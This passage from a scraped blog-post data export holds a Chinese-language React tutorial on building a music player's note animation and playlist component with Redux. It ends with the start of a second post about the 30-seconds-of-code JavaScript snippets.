class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e getTransitionEndName(dom){\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e cssTransition = [\u003cspan class=\"hljs-string\"\u003e\"transition\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"webkitTransition\"\u003c/span\u003e];\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e transitionEnd = {\n        \u003cspan class=\"hljs-string\"\u003e\"transition\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"transitionend\"\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e\"webkitTransition\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"webkitTransitionEnd\"\u003c/span\u003e\n    };\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0; i \u0026lt; cssTransition.length; i++){\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(dom.style[cssTransition[i]] !== undefined){\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e transitionEnd[cssTransition[i]];\n        }\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e undefined;\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e {getTransitionEndName}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eAlbum中导入event.js\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport {getTransitionEndName} from \u003cspan class=\"hljs-string\"\u003e\"@/util/event\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在Album中放三个音符元素，将音符元素的样式写在app.styl中，方便后面公用这个样式\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;CSSTransition \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e={this.state.show} timeout={300} classNames=\u003cspan class=\"hljs-string\"\u003e\"translate\"\u003c/span\u003e\u0026gt;\n\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"music-album\"\u003c/span\u003e\u0026gt;\n\u0009...\n\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"music-ico\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"musicIco1\"\u003c/span\u003e\u0026gt;\n\u0009\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"icon-fe-music\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n\u0009\u0026lt;/div\u0026gt;\n\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"music-ico\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"musicIco2\"\u003c/span\u003e\u0026gt;\n\u0009\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"icon-fe-music\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n\u0009\u0026lt;/div\u0026gt;\n\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"music-ico\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"musicIco3\"\u003c/span\u003e\u0026gt;\n\u0009\u0009\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"icon-fe-music\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n\u0009\u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n\u0026lt;/CSSTransition\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eapp.styl中增加\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e.music-ico\n  position: fixed\n  z-index: 1000\n  margin-top: -7px\n  margin-left: -7px\n  color: \u003cspan class=\"hljs-comment\"\u003e#FFD700\u003c/span\u003e\n  font-size: 14px\n  display: none\n  transition: transform 1s cubic-bezier(.59, -0.1, .83, .67)\n  transform: translate3d(0, 0, 0)\n  div\n    transition: transform 1s\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e.music-ico过渡类型为贝塞尔曲线类型，这个值会使y轴平移的值先过渡到负值（一个负的终点值）然后再过渡到目标值。这里我调的贝塞尔曲线如下\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160b9c7e65e66d85?w=1624\u0026amp;h=621\u0026amp;f=png\u0026amp;s=104235\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n可以到\u003ca target=\"_blank\" href=\"http://cubic-bezier.com\"\u003ehttp://cubic-bezier.com\u003c/a\u003e地址选择自己想要的贝塞尔值\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e编写初始化音符和启动音符下落动画的方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003einitMusicIco\u003c/span\u003e\u003c/span\u003e() {\n\u0009this.musicIcos = [];\n\u0009this.musicIcos.push(ReactDOM.findDOMNode(this.refs.musicIco1));\n\u0009this.musicIcos.push(ReactDOM.findDOMNode(this.refs.musicIco2));\n\u0009this.musicIcos.push(ReactDOM.findDOMNode(this.refs.musicIco3));\n\n\u0009this.musicIcos.forEach((item) =\u0026gt; {\n\u0009\u0009//初始化状态\n\u0009\u0009item.run = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e transitionEndName = getTransitionEndName(item);\n\u0009\u0009item.addEventListener(transitionEndName, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n\u0009\u0009\u0009this.style.display = \u003cspan class=\"hljs-string\"\u003e\"none\"\u003c/span\u003e;\n\u0009\u0009\u0009this.style[\u003cspan class=\"hljs-string\"\u003e\"webkitTransform\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"translate3d(0, 0, 0)\"\u003c/span\u003e;\n\u0009\u0009\u0009this.style[\u003cspan class=\"hljs-string\"\u003e\"transform\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"translate3d(0, 0, 0)\"\u003c/span\u003e;\n\u0009\u0009\u0009this.run = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e icon = this.querySelector(\u003cspan class=\"hljs-string\"\u003e\"div\"\u003c/span\u003e);\n\u0009\u0009\u0009icon.style[\u003cspan class=\"hljs-string\"\u003e\"webkitTransform\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"translate3d(0, 0, 0)\"\u003c/span\u003e;\n\u0009\u0009\u0009icon.style[\u003cspan class=\"hljs-string\"\u003e\"transform\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"translate3d(0, 0, 0)\"\u003c/span\u003e;\n\u0009\u0009}, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n\u0009});\n}\nstartMusicIcoAnimation({clientX, clientY}) {\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.musicIcos.length \u0026gt; 0) {\n\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0; i \u0026lt; this.musicIcos.length; i++) {\n\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e item = this.musicIcos[i];\n\u0009\u0009\u0009//选择一个未在动画中的元素开始动画\n\u0009\u0009\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (item.run === \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n\u0009\u0009\u0009\u0009item.style.top = clientY + \u003cspan class=\"hljs-string\"\u003e\"px\"\u003c/span\u003e;\n\u0009\u0009\u0009\u0009item.style.left = clientX + \u003cspan class=\"hljs-string\"\u003e\"px\"\u003c/span\u003e;\n\u0009\u0009\u0009\u0009item.style.display = \u003cspan class=\"hljs-string\"\u003e\"inline-block\"\u003c/span\u003e;\n\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(() =\u0026gt; {\n\u0009\u0009\u0009\u0009\u0009item.run = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n\u0009\u0009\u0009\u0009\u0009item.style[\u003cspan class=\"hljs-string\"\u003e\"webkitTransform\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"translate3d(0, 1000px, 0)\"\u003c/span\u003e;\n\u0009\u0009\u0009\u0009\u0009item.style[\u003cspan class=\"hljs-string\"\u003e\"transform\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"translate3d(0, 1000px, 0)\"\u003c/span\u003e;\n\n\u0009\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e icon = item.querySelector(\u003cspan class=\"hljs-string\"\u003e\"div\"\u003c/span\u003e);\n\u0009\u0009\u0009\u0009\u0009icon.style[\u003cspan class=\"hljs-string\"\u003e\"webkitTransform\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"translate3d(-30px, 0, 0)\"\u003c/span\u003e;\n\u0009\u0009\u0009\u0009\u0009icon.style[\u003cspan class=\"hljs-string\"\u003e\"transform\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"translate3d(-30px, 0, 0)\"\u003c/span\u003e;\n\u0009\u0009\u0009\u0009}, 10);\n\u0009\u0009\u0009\u0009\u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n\u0009\u0009\u0009}\n\u0009\u0009}\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e获取所有的音符元素添加到\u003cstrong\u003emusicIcos\u003c/strong\u003e数组中，然后遍历给每个元素添加transitionEnd事件，事件处理函数中将音符元素的位置重置。给每一个音符dom对象添加一个自定义的属性\u003cstrong\u003erun\u003c/strong\u003e标记当前的元素是否在运动中。在启动音符动画时遍历musicIcos数组，找到一个run为false的元素根据事件对象的\u003cstrong\u003eclientX\u003c/strong\u003e和\u003cstrong\u003eclientY\u003c/strong\u003e设置\u003cstrong\u003eleft\u003c/strong\u003e和\u003cstrong\u003etop\u003c/strong\u003e，开始过渡动画，随后立即停止循环。这样做是为了连续点击时前一个元素未运动完成，使用下一个未运动的元素运动，当运动完成后run变为false，下次点击时继续使用\u003c/p\u003e\n\u003cp\u003e我们在componentDidMount中调用\u003cstrong\u003einitMusicIco\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.initMusicIco();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后在歌曲点击事件中调用\u003cstrong\u003estartMusicIcoAnimation\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eselectSong(song) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (e) =\u0026gt; {\n        this.props.setSongs([song]);\n        this.props.changeCurrentSong(song);\n        this.startMusicIcoAnimation(e.nativeEvent);\n    };\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003ee.nativeEvent获取的是原生的事件对象，这里是由Scroll组件中的better-scroll派发的，在1.6.0版本以前better-scroll并未传递clientX和clientY，现已将better-scroll升级到1.6.0\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e效果图如下\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160b9ff631af603d?w=434\u0026amp;h=880\u0026amp;f=gif\u0026amp;s=2088569\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e开发播放列表\u003c/h3\u003e\n\u003cp\u003e考虑到播放列表有很多列表数据，如果放在Player组件中每次更新播放进度都会调用render函数，对列表进行遍历，影响性能，所以把播放列表组件和播放组件分成两个组件并放到MusicPlayer组件中，它们之间通过父组件MusicPlayer来进行数据交互\u003c/p\u003e\n\u003cp\u003e在play目录下新建\u003cstrong\u003eMusicPlayer.js\u003c/strong\u003e，然后导入Player.js\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eMusicPlayer.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport React from \u003cspan class=\"hljs-string\"\u003e\"react\"\u003c/span\u003e\nimport Player from \u003cspan class=\"hljs-string\"\u003e\"@/containers/Player\"\u003c/span\u003e\n\nclass MusicPlayer extends React.Component {\n    constructor(props) {\n        super(props);\n    }\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n            \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"music-player\"\u003c/span\u003e\u0026gt;\n                \u0026lt;Player/\u0026gt;\n            \u0026lt;/div\u0026gt;\n        );\n    }\n}\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default MusicPlayer;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在App.js中导入MusicPlayer.js替换掉原来的Player组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//import Player from \u003cspan class=\"hljs-string\"\u003e\"../containers/Player\"\u003c/span\u003e\nimport MusicPlayer from \u003cspan class=\"hljs-string\"\u003e\"./play/MusicPlayer\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;Router\u0026gt;\n  \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"app\"\u003c/span\u003e\u0026gt;\n    ...\n    {/*\u0026lt;Player/\u0026gt;*/}\n    \u0026lt;MusicPlayer/\u0026gt;\n  \u0026lt;/div\u0026gt;\n\u0026lt;/Router\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e继续在play下新建\u003cstrong\u003ePlayerList.js\u003c/strong\u003e和\u003cstrong\u003eplayerlist.styl\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ePlayerList.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport React from \u003cspan class=\"hljs-string\"\u003e\"react\"\u003c/span\u003e\nimport ReactDOM from \u003cspan class=\"hljs-string\"\u003e\"react-dom\"\u003c/span\u003e\n\nimport \u003cspan class=\"hljs-string\"\u003e\"./playerlist.styl\"\u003c/span\u003e\n\nclass PlayerList extends React.Component {\n\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n            \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-list\"\u003c/span\u003e\u0026gt;\n            \u0026lt;/div\u0026gt;\n        );\n    }\n}\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default PlayerList\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003eplayerlist.styl代码在源码中查看\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003ePlayerList需要从redux中获取歌曲列表，所以先把PlayerList包装成容器组件。在containers目录下新建\u003cstrong\u003ePlayerList.js\u003c/strong\u003e，代码如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport {connect} from \u003cspan class=\"hljs-string\"\u003e\"react-redux\"\u003c/span\u003e\nimport {changeSong, removeSong} from \u003cspan class=\"hljs-string\"\u003e\"../redux/actions\"\u003c/span\u003e\nimport PlayerList from \u003cspan class=\"hljs-string\"\u003e\"../components/play/PlayerList\"\u003c/span\u003e\n\n//映射Redux全局的state到组件的props上\nconst mapStateToProps = (state) =\u0026gt; ({\n    currentSong: state.song,\n    playSongs: state.songs\n});\n\n//映射dispatch到props上\nconst mapDispatchToProps = (dispatch) =\u0026gt; ({\n    changeCurrentSong: (song) =\u0026gt; {\n        dispatch(changeSong(song));\n    },\n    removeSong: (id) =\u0026gt; {\n        dispatch(removeSong(id));\n    }\n});\n\n//将ui组件包装成容器组件\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default connect(mapStateToProps, mapDispatchToProps)(PlayerList)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后在MusicPlayer.js中导入PlayerList容器组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport PlayerList from \u003cspan class=\"hljs-string\"\u003e\"@/containers/PlayerList\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"music-player\"\u003c/span\u003e\u0026gt;\n    \u0026lt;Player/\u0026gt;\n    \u0026lt;PlayerList/\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这时PlayerList组件可以从redux获取播放列表数据了。歌曲列表同样会用到Scroll滚动组件，在歌曲播放组件中点击歌曲列表按钮会显示歌曲列表，把这个属性放到父组件MusicPlayer中，PlayerList通过props获取这个属性来启动显示和隐藏动画，PlayerList自身也可以关闭。同时它们共同使用获取当前播放歌曲位置属性和改变歌曲位置的函数，通过MsuciPlayer组件传入\u003c/p\u003e\n\u003cp\u003eMusicPlayer.js增加两个state，一个改变歌曲播放位置和一个改变播放列表显示状态的方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econstructor(props) {\n    super(props);\n    this.state = {\n        currentSongIndex: 0,\n        show: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,  //控制播放列表显示和隐藏\n    }\n}\nchangeCurrentIndex = (index) =\u0026gt; {\n    this.setState({\n        currentSongIndex: index\n    });\n}\nshowList = (status) =\u0026gt; {\n    this.setState({\n        show: status\n    });\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e把状态和方法同props传递给子组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;Player currentIndex={this.state.currentSongIndex}\n        showList={this.showList}\n        changeCurrentIndex={this.changeCurrentIndex}/\u0026gt;\n\u0026lt;PlayerList currentIndex={this.state.currentSongIndex}\n            showList={this.showList}\n            changeCurrentIndex={this.changeCurrentIndex}\n            show={this.state.show}/\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ePlayerList使用一个state来控制显示和隐藏，通过CSSTransition的钩子函数来修改状态\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.state = {\n    showList: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-list\"\u003c/span\u003e\u0026gt;\n    \u0026lt;CSSTransition \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e={this.props.show} classNames=\u003cspan class=\"hljs-string\"\u003e\"fade\"\u003c/span\u003e timeout={500}\n                   onEnter={() =\u0026gt; {\n                       this.setState({showList:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e});\n                   }}\n                   onEntered={() =\u0026gt; {\n                       this.refs.scroll.refresh();\n                   }}\n                   onExited={() =\u0026gt; {\n                       this.setState({showList:\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\n                   }}\u0026gt;\n    \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-list-bg\"\u003c/span\u003e style={this.state.showList === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e ? {display:\u003cspan class=\"hljs-string\"\u003e\"block\"\u003c/span\u003e} : {display:\u003cspan class=\"hljs-string\"\u003e\"none\"\u003c/span\u003e}}\u0026gt;\n        ...\n    \u0026lt;/div\u0026gt;\n    \u0026lt;/CSSTransition\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在Player.js中上一首、下一首和音频播放结束中的this.currentIndex = currentIndex修改为调用\u003cstrong\u003echangeCurrentIndex\u003c/strong\u003e方法，同时在render函数中的第一行获取播放歌曲的位\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//this.currentIndex = currentIndex;\n\n//调用父组件修改当前歌曲位置\nthis.props.changeCurrentIndex(currentIndex);\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.currentIndex = this.props.currentIndex;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e给Player组件中的播放列表按钮添加事件，调用父组件的\u003cstrong\u003eshowList\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eshowPlayList = () =\u0026gt; {\n    this.props.showList(\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-list-button\"\u003c/span\u003e onClick={this.showPlayList}\u0026gt;\n    \u0026lt;i className=\u003cspan class=\"hljs-string\"\u003e\"icon-play-list\"\u003c/span\u003e\u0026gt;\u0026lt;/i\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e给PlayerList组件中的遮罩背景和关闭按钮也添加点击事件，用来隐藏播放列表\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eshowOrHidePlayList = () =\u0026gt; {\n    this.props.showList(\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-list-bg\"\u003c/span\u003e style={this.state.showList === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e ? {display:\u003cspan class=\"hljs-string\"\u003e\"block\"\u003c/span\u003e} : {display:\u003cspan class=\"hljs-string\"\u003e\"none\"\u003c/span\u003e}}\n     onClick={this.showOrHidePlayList}\u0026gt;\n    {/*播放列表*/}\n    \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-list-wrap\"\u003c/span\u003e\u0026gt;\n        \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-list-head\"\u003c/span\u003e\u0026gt;\n            \u0026lt;span className=\u003cspan class=\"hljs-string\"\u003e\"head-title\"\u003c/span\u003e\u0026gt;播放列表\u0026lt;/span\u0026gt;\n            \u0026lt;span className=\u003cspan class=\"hljs-string\"\u003e\"close\"\u003c/span\u003e onClick={this.showOrHidePlayList}\u0026gt;关闭\u0026lt;/span\u0026gt;\n        \u0026lt;/div\u0026gt;\n        ...\n    \u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在播放列表中点击歌曲也是可以播放当前歌曲，点击删除按钮把歌曲从歌曲列表中移除，接下来处理这两个事件。给PlayerList组件添加播放歌曲和移除歌曲的两个方法，并给歌曲包裹元素和删除按钮添加点击事件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eplaySong(song, index) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e () =\u0026gt; {\n        this.props.changeCurrentSong(song);\n        this.props.changeCurrentIndex(index);\n\n        this.showOrHidePlayList();\n    };\n}\nremoveSong(id, index) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e () =\u0026gt; {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.props.currentSong.id !== id) {\n            this.props.removeSong(id);\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (index \u0026lt; this.props.currentIndex) {\n                //调用父组件修改当前歌曲位置\n                this.props.changeCurrentIndex(this.props.currentIndex - 1);\n            }\n        }\n    };\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"item-right\"\u003c/span\u003e\u0026gt;\n    \u0026lt;div className={isCurrent ? \u003cspan class=\"hljs-string\"\u003e\"song current\"\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"song\"\u003c/span\u003e} onClick={this.playSong(song, index)}\u0026gt;\n        \u0026lt;span className=\u003cspan class=\"hljs-string\"\u003e\"song-name\"\u003c/span\u003e\u0026gt;{song.name}\u0026lt;/span\u0026gt;\n        \u0026lt;span className=\u003cspan class=\"hljs-string\"\u003e\"song-singer\"\u003c/span\u003e\u0026gt;{song.singer}\u0026lt;/span\u0026gt;\n    \u0026lt;/div\u0026gt;\n    \u0026lt;i className=\u003cspan class=\"hljs-string\"\u003e\"icon-delete delete\"\u003c/span\u003e onClick={this.removeSong(song.id, index)}\u0026gt;\u0026lt;/i\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里有一个小问题点击删除按钮后，播放列表会被关闭，因为点击事件会传播到它的上级元素.play-list-bg上。在.play-list-bg的第一个子元素.play-list-wrap增加点击事件然后阻止事件传播\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-list-wrap\"\u003c/span\u003e onClick={e =\u0026gt; e.stopPropagation()}\u0026gt;\n    ...\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e到此核心播放功能组件已经完成\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e总结\u003c/h3\u003e\n\u003cp\u003e这一节是最核心的功能，内容比较长，逻辑也很复杂。做音乐播放主要是使用H5的audio标签的play、pause方法，canplay、timeupdate、ended等事件，结合ui框架，在适当的时候更新ui。audio在移动端第一次加载页面后如果没有触摸屏幕它是无法自动播放的，因为这里渲染App组件的时候就已经触摸了很多次屏幕，所以这里只需要调用play方法即可进行播放。使用React的时候尽可能的把组件细化，React组件更新入口只有一个render方法，而render中都是渲染ui，如果render频繁调用的话，就需要把不需要频繁更新的子组件抽取出来，避免不必要的性能消耗\u003c/p\u003e\n\u003cp\u003e歌曲播放组件出现和隐藏动画主要使用react-transition-group这个库，结合钩子函数onEnter、onExited，在onEnter时组件刚开始进入，让播放组件显示。在onExited时组件已经离开后表示离开状态过渡已经完成，把播放组件隐藏。音符动画主要利用贝塞尔曲线过渡类型，贝塞尔曲线也可以做添加购物车动画，调整贝塞尔曲线值，然后目标translate位置通过目标元素和购物车位置计算出来即可\u003c/p\u003e\n\u003cp\u003e完整项目地址：\u003ca target=\"_blank\" href=\"https://github.com/code-mcx/mango-music\"\u003ehttps://github.com/code-mcx/mango-music\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e欢迎star\u003c/p\u003e\n\u003cp\u003e本章节代码在\u003cstrong\u003echapter5\u003c/strong\u003e分支\u003c/p\u003e\n\u003cp\u003e后续更新中...\u003c/p\u003e\n","buildTime":"1514979802.4804","__v":0}
{"_id":{"$oid":"5a4cc38785472a29ac403365"},"id":"5a3e81a251882512b67ae48f","author":{"$oid":"5a4b76338b69bb25d83da3d0"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"JavaScript30秒， 从入门到放弃","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"最近很火的github上的库30-seconds-of-code，特别有意思，代码也很优雅。 计算数组的最大公约数。 使用Array.reduce()和gcd公式(使用递归)来计算一个数组的最大公约数。 gcd即欧几里德算法，具体不表，自查。这里用到了数组的reduce方法，相…","content":"\u003ch1 class=\"heading\"\u003e有意思\u003c/h1\u003e\n\u003cp\u003e最近很火的\u003ccode\u003egithub\u003c/code\u003e上的库\u003ca target=\"_blank\" href=\"https://github.com/Chalarangelo/30-seconds-of-code\"\u003e\u003ccode\u003e30-seconds-of-code\u003c/code\u003e\u003c/a\u003e，特别有意思，代码也很优雅。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e能学es6\u003c/li\u003e\n\u003cli\u003e自己翻译，能学英语\u003c/li\u003e\n\u003cli\u003e代码很美，很优雅，美即正义\u003c/li\u003e\n\u003cli\u003e函数式表达，享受\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 